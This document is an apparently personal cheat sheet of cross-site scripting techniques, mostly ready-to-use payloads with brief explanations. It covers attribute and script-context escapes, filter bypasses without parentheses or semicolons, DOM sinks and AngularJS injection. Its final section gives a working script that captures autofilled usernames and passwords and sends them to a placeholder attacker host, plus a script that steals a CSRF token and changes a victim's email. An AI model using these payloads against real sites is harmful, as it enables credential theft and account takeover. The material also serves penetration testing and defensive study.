XSS

* Cross Origin iframes are prevented from calling alert() from version 92 onward. Alternatively, print() function can be used for detection.


Three Types Of XSS

-> Reflected: Malicious script comes from current HTTP request
-> Stored Malicious script comes from the DB
-> Dom-based: Exists in the client-side code rather than server-side code


XSS Payloads

-> Custom tag: <xss autofocus tabindex=1 onfocus=alert(1)></xss>

-> <svg><animatetransform onbegin=alert(1) attributeName=transform>

-> By using "animate" tag, we can dynamically set attribute and values.
Example payload: 
<svg><a><animate attributeName="href" values="javascript:alert()"></animate> <text font-size="16" x="0" y="16">Click</text></a></svg>

-> If we can terminate the attribute value but cannot escape the tag, we can use a payload similar to the following:

 " autofocus onfocus=alert(document.domain) x="

-> I have injected the above payload inside "input" tag and it worked.

-> javascript:alert() payload is used when user supplied input is directly placed into href tag. 

-> data:text/javascript;base64,YWxlcnQoMSk7  can be used when src attribute of script tag is the attack surface.

-> We can make use of canonical tags for XSS detection. 
Example payloads: 
- <input type="hidden" accesskey="X" onclick="alert(1)">
- <link rel="canonical" accesskey="X" onclick="alert(1)" />
But user is required to press some extra keyboard buttons to trigger the XSS payload.

* If the current attack surface is inside javaScript part of the HTML context, we can still exploit it even if backslashes and single quotes are escaped.
Example payload:
-> </script> <img src=x onerror=alert(1)>

The reason this works is that the browser first performs HTML parsing to identify the page elements including blocks of script, and only later performs JavaScript parsing to understand and execute the embedded scripts. The

Example payloads when the target context is inside JavaScript part of the HTML ( <script></script>):
-> '-alert(document.domain)-'
-> ';alert(document.domain)//

* If single quotes are escaped, backslashes should also be esaceped. Assuming the target context is within the JavaScript part.

* Sometimes WAF or server side code restricts some characters such as paranthesis. In this case we can make use of throw to bypass it.
Example payload:
-> <script>onerror=alert;throw 1337</script>

* If semicolons are restricted as well as paranthesis, we can use the following payload:
-> <script>{onerror=alert}throw 1337</script>

* Another payload is where we can do them at the same time. The last arguement is sent to alert and onerror assignment must be before this arguement.
-> <script>throw onerror=alert,'some string',123,'haha'</script>

* In some cases of throwing exceptions, browsers may add "uncaught" as prefix. To bypass it, we can use a payload similar to:
-> <script>{onerror=eval}throw'=alert\x281337\x29'</script>

Another interesting payload is:
-> &'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
* This payload is used to inject XSS into <a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d1'}).finally(_ => window.location = '/')">Back to Blog</a>

Explanation of this payload:
-> throw/**/onerror=alert,1337 is used to call alert in case of an exception with arguement 1337. Here we use /**/ instead of a space character since space character may be escaped as a prevention.
-> We make it as a lambda function x
-> We equate (override) the built-in JavaScript function toString to the lambda function we have just defined.
-> We use window + '' to call toString. Here, window object is not a string. Therefore, it will cause to call toString function, which is actually our lambda function.

* When the XSS context is some existing JavaScript within a quoted tag attribute, such as an event handler, it is possible to make use of HTML-encoding to work around some input filters.
* The &apos; sequence is an HTML entity representing an apostrophe or single quote. Because the browser HTML-decodes the value of the onclick attribute before the JavaScript is interpreted, the entities are decoded as quotes, which become string delimiters, and so the attack succeeds
Example payload:
-> &apos;-alert(document.domain)-&apos;

* Template literals are of the form: var input = `controllable data here`;
* We can also attack into JavaScript Template Literals. In this case, we need to insert our code into ${...} to be evaluated.

DOM BASED XSS

* There are some sinks
-> document.write(....)
-> innerHTML
-> .attr(...)  ( For Jquery )
-> document.writeln()
-> document.domain
-> element.innerHTML
-> element.outerHTML
-> element.insertAdjacentHTML
-> element.onevent

* The innerHTML sink does not accept <script> elements on any modern browser, nor <svg onload .. > events fire. So, we need to use alternative elements like <img> or <iframe>. Event handlers can be used with those tags.

* Jquery's $() selector can be used to inject malicious XSS payloads.
* Recent Jquery prevents from giving HTML into this.
* One way to trigger hashchange event without user interaction is the following.
-> <iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'" 

* Example payload for angular js: (For example, we can use double quote instead of single quote if single is encoded or escaped)
-> {{$on.constructor('alert(1)')()}} 

* If eval is used to evaluate json data to convert it into object, we can used the following payload.
->  " }-alert(1)// 
* This payload first escapes the Json and then comments out the rest.

EXPLOIT OF XSS
---------------

* The following payload can be used to steal autofill username & password.

PAYLOAD: 
    <form>
        <input id="uname" type="text" name="username">
        <input id="passwd" type="password" name="password">
    </form>
    <script>
        var uname = document.getElementById('uname');
        var passwd = document.getElementById('passwd');

        uname.addEventListener('change', function(){
            sendDataToServer(  uname.value );
        });

        passwd.addEventListener('change', function(){
            sendDataToServer( passwd.value );
        });

        function sendDataToServer(data) {
            const queryParams = new URLSearchParams(data).toString();
            const url = `https://hackerWebsite?x=${queryParams}`;

            fetch(url, {
                method: 'GET'
            })
            .then(response => response.json())
            .then(result => {
                //console.log('Server response:', result);
            })
            .catch(error => {
                //console.error('Error sending data:', error);
            });
            }
    </script>

* We can also use XSS to steal CSRF tokens and send request with the stolen cookie.
-> 
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
